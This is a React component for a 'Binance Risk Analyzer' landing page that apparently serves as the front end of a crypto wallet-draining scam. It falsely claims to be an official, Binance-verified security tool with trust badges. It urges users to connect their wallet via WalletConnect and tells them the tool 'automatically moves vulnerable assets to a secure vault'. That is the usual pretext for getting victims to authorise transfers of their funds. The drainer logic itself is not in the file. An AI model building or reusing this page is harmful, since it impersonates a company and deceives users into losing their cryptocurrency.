import { Shield, AlertTriangle, Eye, Radar, Lock, Zap, CheckCircle, ShieldCheck } from "lucide-react";

interface SecurityScannerProps {
  onStartScan: () => void;
}

export function SecurityScanner({ onStartScan }: SecurityScannerProps) {
  return (
    <div className="space-y-8">
      {/* Hero Section */}
      <div className="text-center">
        <div className="relative inline-block mb-6">
          <div className="w-28 h-28 bg-gradient-to-br from-slate-800 to-slate-900 border-2 border-amber-400/50 rounded-2xl flex items-center justify-center relative shadow-xl shadow-amber-400/10">
            <div className="absolute inset-0 bg-amber-400/5 rounded-2xl" />
            <svg viewBox="0 0 126.61 126.61" className="w-14 h-14 text-amber-400 relative z-10">
              <path fill="currentColor" d="M38.73 53.2L63.3 28.63l24.58 24.58 14.3-14.3L63.3 0 24.43 38.88zM0 63.3l14.3-14.3 14.3 14.3-14.3 14.3zM38.73 73.4L63.3 97.97l24.58-24.58 14.31 14.29L63.3 126.61l-38.87-38.88-.01-.01zM97.99 63.3l14.31-14.3 14.3 14.3-14.3 14.3z"/>
              <path fill="currentColor" d="M63.3 48.99L77.61 63.3 63.3 77.61 48.99 63.3z"/>
            </svg>
          </div>
          <div className="absolute -top-2 -right-2 w-8 h-8 bg-emerald-500 rounded-full flex items-center justify-center border-4 border-slate-950">
            <ShieldCheck className="w-4 h-4 text-white" />
          </div>
        </div>
        
        <h1 className="text-4xl font-bold mb-3">
          <span className="text-amber-400">Binance</span>
          <span className="text-white"> Risk Analyzer</span>
        </h1>
        <p className="text-slate-400 max-w-md mx-auto mb-2">
          Advanced security protocol to detect and neutralize malicious scripts in your wallet
        </p>
        <div className="flex items-center justify-center gap-2 text-amber-400 text-sm">
          <div className="w-2 h-2 bg-emerald-400 rounded-full animate-pulse" />
          <span>Official Binance Security Tool</span>
        </div>
      </div>

      {/* Trust Indicators */}
      <div className="flex items-center justify-center gap-6 text-xs">
        <div className="flex items-center gap-1.5 text-slate-500">
          <CheckCircle className="w-3.5 h-3.5 text-emerald-400" />
          <span>Verified by Binance</span>
        </div>
        <div className="flex items-center gap-1.5 text-slate-500">
          <Shield className="w-3.5 h-3.5 text-amber-400" />
          <span>Audited Protocol</span>
        </div>
        <div className="flex items-center gap-1.5 text-slate-500">
          <Lock className="w-3.5 h-3.5 text-amber-400" />
          <span>End-to-End Encrypted</span>
        </div>
      </div>

      {/* Features Grid */}
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        <div className="bg-slate-900/80 border border-slate-800 rounded-xl p-5 text-center hover:border-amber-400/30 transition-colors">
          <div className="w-12 h-12 bg-amber-400/10 rounded-xl flex items-center justify-center mx-auto mb-3">
            <Radar className="w-6 h-6 text-amber-400" />
          </div>
          <h3 className="font-semibold text-white mb-1">Deep Scan</h3>
          <p className="text-xs text-slate-500">Analyzes all token contracts</p>
        </div>
        
        <div className="bg-slate-900/80 border border-slate-800 rounded-xl p-5 text-center hover:border-amber-400/30 transition-colors">
          <div className="w-12 h-12 bg-amber-400/10 rounded-xl flex items-center justify-center mx-auto mb-3">
            <Eye className="w-6 h-6 text-amber-400" />
          </div>
          <h3 className="font-semibold text-white mb-1">Threat Detection</h3>
          <p className="text-xs text-slate-500">Identifies malicious scripts</p>
        </div>
        
        <div className="bg-slate-900/80 border border-slate-800 rounded-xl p-5 text-center hover:border-amber-400/30 transition-colors">
          <div className="w-12 h-12 bg-amber-400/10 rounded-xl flex items-center justify-center mx-auto mb-3">
            <Lock className="w-6 h-6 text-amber-400" />
          </div>
          <h3 className="font-semibold text-white mb-1">Auto-Protect</h3>
          <p className="text-xs text-slate-500">Neutralizes threats instantly</p>
        </div>
      </div>

      {/* Warning Banner */}
      <div className="bg-amber-500/10 border border-amber-500/30 rounded-xl p-4">
        <div className="flex items-start gap-3">
          <div className="w-8 h-8 bg-amber-500/20 rounded-lg flex items-center justify-center flex-shrink-0">
            <AlertTriangle className="w-4 h-4 text-amber-400" />
          </div>
          <div>
            <h4 className="font-semibold text-amber-400 mb-1">Security Advisory</h4>
            <p className="text-xs text-slate-400">
              Malicious scripts can drain your wallet without notice. Our protocol automatically moves vulnerable assets to a secure vault for protection.
            </p>
          </div>
        </div>
      </div>

      {/* Scan Button */}
      <button
        onClick={onStartScan}
        className="w-full bg-amber-400 hover:bg-amber-300 text-slate-950 font-bold py-5 px-8 rounded-xl text-lg shadow-xl shadow-amber-400/20 transition-all duration-200 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center gap-3"
      >
        <Radar className="w-6 h-6" />
        Scan Now
      </button>
      
      <div className="text-center space-y-2">
        <p className="text-slate-600 text-xs">
          Connects via WalletConnect • Scans BSC network • Auto-protects vulnerable assets
        </p>
        <div className="flex items-center justify-center gap-2 text-xs text-slate-700">
          <Shield className="w-3 h-3 text-emerald-400" />
          <span>Protected by Binance Security Protocol</span>
        </div>
      </div>
    </div>
  );
}